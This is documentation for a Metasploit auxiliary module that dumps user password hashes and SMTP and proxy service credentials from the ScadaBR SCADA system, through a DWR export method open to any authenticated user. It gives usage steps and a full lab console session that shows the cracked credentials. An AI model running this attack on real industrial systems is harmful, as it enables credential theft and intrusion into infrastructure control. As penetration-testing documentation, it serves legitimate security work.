## Vulnerable Application

This module retrieves credentials from ScadaBR, including
service credentials and unsalted SHA1 password hashes for
all users, by invoking the `EmportDwr.createExportData` DWR
method of Mango M2M which is exposed to all authenticated
users regardless of privilege level.

ScadaBR is a SCADA (Supervisory Control and Data Acquisition)
system with applications in Process Control and Automation,
being developed and distributed using the open source model.

This module has been tested successfully with ScadaBR
versions 1.0 CE and 0.9 on Windows and Ubuntu systems.

## Verification Steps

Download:

* [Windows Installers](https://sourceforge.net/projects/scadabr/files/Software/Installer%20Win32/)
* [Linux Installers](https://sourceforge.net/projects/scadabr/files/Software/Linux/)
* [Tomcat WAR files](https://sourceforge.net/projects/scadabr/files/Software/WAR/)

Metasploit:

1. Start `msfconsole`
1. Do: `use auxiliary/admin/http/scadabr_credential_dump`
1. Do: `set rhosts [IP]`
1. Do: `set username [USERNAME]`
1. Do: `set password [PASSWORD]`
1. Do: `run`
1. You should get credentials

## Options

### USERNAME

The username for the application (default: `admin`)

### PASSWORD

The password for the application (default: `admin`)

### PASS_FILE

Wordlist file to crack password hashes (default: `./data/unix_passwords.txt`)

## Scenarios

```
msf6 > use auxiliary/admin/http/scadabr_credential_dump 
msf6 auxiliary(admin/http/scadabr_credential_dump) > set rhosts 172.16.191.194
rhosts => 172.16.191.194
msf6 auxiliary(admin/http/scadabr_credential_dump) > set username admin
username => admin
msf6 auxiliary(admin/http/scadabr_credential_dump) > set password admin
password => admin
msf6 auxiliary(admin/http/scadabr_credential_dump) > run
[*] Running module against 172.16.191.194

[+] 172.16.191.194:8080 Authenticated successfully as 'admin'
[+] 172.16.191.194:8080 Export successful (4735 bytes)
[+] Config saved in: /root/.msf4/loot/20210220192214_default_172.16.191.194_scadabr.config_546879.txt
[+] Found 5 users
[*] Found weak credentials (admin:admin)
[*] Found weak credentials (operator:a)
[*] Found weak credentials (test:sunshine)
[*] Found weak credentials (user:A)
[*] Found weak credentials (zxcv:zxcv)

ScadaBR User Credentials
========================

 Username  Password  Hash (SHA1)                               Role   E-mail
 --------  --------  -----------                               ----   ------
 admin     admin     d033e22ae348aeb5660fc2140aec35850c4da997  Admin  admin@yourMangoDomain.com
 operator  a         86f7e437faa5a7fce15d1ddcb9eaeaea377667b8  User   operator@localhost
 test      sunshine  8d6e34f987851aa599257d3831a1af040886842f  User   test@localhost
 user      A         6dcd4ce23d88e2ee9568ba546c007c63d9131c1b  Admin  user@localhost
 zxcv      zxcv      9878e362285eb314cfdbaa8ee8c300c285856810  User   zxcv@localhost

[+] Found SMTP credentials: smtptestuser:smtptestpass@127.0.0.1:25
[+] Found HTTP proxy credentials: proxytestuser:proxytestpass@127.0.0.1:8080

ScadaBR Service Credentials
===========================

 Service     Host       Port  Username       Password
 -------     ----       ----  --------       --------
 HTTP proxy  127.0.0.1  8080  proxytestuser  proxytestpass
 SMTP        127.0.0.1  25    smtptestuser   smtptestpass

[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/scadabr_credential_dump) > creds
Credentials
===========

host            origin          service          public    private   realm  private_type  JtR Format
----            ------          -------          ------    -------   -----  ------------  ----------
172.16.191.194  172.16.191.194  8080/tcp (http)  admin     admin            Password
172.16.191.194  172.16.191.194  8080/tcp (http)  operator  a                Password
172.16.191.194  172.16.191.194  8080/tcp (http)  test      sunshine         Password
172.16.191.194  172.16.191.194  8080/tcp (http)  user      A                Password
172.16.191.194  172.16.191.194  8080/tcp (http)  zxcv      zxcv             Password

msf6 auxiliary(admin/http/scadabr_credential_dump) > 
```

